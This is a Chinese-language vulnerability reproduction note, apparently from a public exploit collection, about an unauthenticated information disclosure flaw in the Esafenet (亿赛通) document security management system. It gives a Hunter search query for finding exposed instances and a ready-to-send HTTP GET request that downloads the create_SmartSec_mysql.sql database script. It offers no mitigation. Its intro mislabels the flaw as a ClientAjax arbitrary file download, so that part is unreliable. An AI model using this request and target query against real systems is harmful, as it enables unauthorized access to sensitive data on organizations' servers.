# 亿赛通 电子文档安全管理系统 create_SmartSec_mysql信息泄露

# 一、漏洞简介
亿赛通电子文档安全管理系统是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。亿赛通 电子文档安全管理系统 ClientAjax 任意文件下载。

# 二、影响版本
+ 亿赛通电子文档安全管理系统

# 三、资产测绘
+ hunter`app.name="ESAFENET 亿赛通文档安全管理系统"`
+ 登录页面

![1693912211487-1ee3eb84-62a3-4c32-806a-6be32537dfb6.png](./img/1GlZaQKLE2cGUVGj/1693912211487-1ee3eb84-62a3-4c32-806a-6be32537dfb6-425256.png)

# 四、漏洞复现
```plain
GET /CDGServer3/SQL/MYSQL/create_SmartSec_mysql.sql HTTP/1.1
Host: xxx.xxx.xxx.xxx
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![1710086299125-e7611d63-bf75-4545-9198-b1f8360a83ba.png](./img/1GlZaQKLE2cGUVGj/1710086299125-e7611d63-bf75-4545-9198-b1f8360a83ba-948062.png)



> 更新: 2024-04-20 22:01:30  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fforzmhq7r1n8vnz>